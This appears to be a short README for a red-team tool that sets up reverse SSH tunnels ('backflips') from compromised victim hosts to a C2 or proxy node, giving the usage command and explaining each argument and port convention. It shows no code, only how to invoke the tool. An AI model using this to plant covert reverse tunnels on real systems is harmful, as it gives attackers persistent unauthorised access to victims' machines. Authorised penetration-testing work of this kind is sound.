# SSH Backflip Generator

## Useage

`sudo python3 backflipdeploy.py <username> <victim_host> <c2_fqdn/ip> <port> <remote_port>`

## Arguments

username: Arbitrary name of the user you are compromising. Stored locally in `/opt/backflips` on a poryx

victim_host: Arbitrary name of the host you are compromising. Stored locally in `/opt/backflips` on a proxy

c2_fqdn/ip: The IP address or domain of the edge sketch node the backflip will connect through

port: Port that forwards back to the victim (tcp/22). Use a range of 4000 and upwards. Track this on the `Table for tracking backflips` in an engagements infra.

remote_port: The secondary edge port that the backflip SSH service is running on, which for RTI is 2222.
